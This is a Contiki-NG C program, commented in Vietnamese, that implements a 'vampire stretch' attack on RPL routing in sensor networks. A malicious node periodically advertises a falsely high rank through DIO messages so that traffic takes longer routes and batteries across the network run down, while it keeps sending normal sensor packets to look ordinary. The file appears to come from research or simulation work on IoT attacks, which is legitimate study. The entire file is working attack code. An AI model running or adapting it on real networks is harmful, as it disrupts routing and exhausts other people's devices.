/*
 * VAMPIRE ATTACK: STRETCH ATTACK
 * 
 * Mô tả: Attacker advertise một đường đi dài hơn bình thường
 *        bằng cách thao túng RPL rank
 * 
 * Đặc điểm:
 *   - Tăng rank value cao bất thường (1500-2000)
 *   - Khiến gói tin đi đường vòng xa hơn cần thiết
 *   - Không thay đổi version number nhiều (stealth hơn)
 *   - Tăng hop count của routes
 * 
 * Impact: Gói tin phải đi qua nhiều hops hơn → tiêu tốn pin toàn mạng
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "STRETCH"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Stretch attack parameters */
#define NORMAL_SEND_INTERVAL    (10 * CLOCK_SECOND)
#define RANK_MANIPULATION_INTERVAL (20 * CLOCK_SECOND)  // Thao túng rank mỗi 20s
#define MALICIOUS_RANK_BASE     1500   // Rank cao bất thường
#define MALICIOUS_RANK_VARIANCE 400    // Random variance

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;

PROCESS(vampire_stretch_process, "Vampire Stretch Attack");
AUTOSTART_PROCESSES(&vampire_stretch_process);

PROCESS_THREAD(vampire_stretch_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer rank_attack_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  static uint32_t attack_count = 0;
  
  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("============================================\n");
  LOG_INFO("VAMPIRE ATTACK: STRETCH ATTACK ACTIVATED\n");
  LOG_INFO("Attack strategy: RPL rank manipulation (high rank)\n");
  LOG_INFO("============================================\n");
  
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  etimer_set(&rank_attack_timer, RANK_MANIPULATION_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* RANK MANIPULATION to create long routes */
    if(ev == PROCESS_EVENT_TIMER && data == &rank_attack_timer) {
        if(curr_instance.used && curr_instance.dag.preferred_parent != NULL) {
            rpl_rank_t old_rank = curr_instance.dag.rank;
            
            // Set abnormally high rank to force longer routes
            rpl_rank_t malicious_rank = MALICIOUS_RANK_BASE + 
                                       (random_rand() % MALICIOUS_RANK_VARIANCE);
            curr_instance.dag.rank = malicious_rank;
            
            LOG_INFO("STRETCH_ATTACK rank_manipulation: %u -> %u (attack #%lu)\n", 
                     old_rank, curr_instance.dag.rank, (unsigned long)++attack_count);
            
            // Advertise the malicious rank via DIO
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&rank_attack_timer, RANK_MANIPULATION_INTERVAL);
    }

    /* Normal data transmission */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.cluster_id = (node_id <= 26) ? 1 : 2;
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_DBG("NORMAL_TX node=%u seq=%lu\n", node_id, (unsigned long)p.seqno);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}
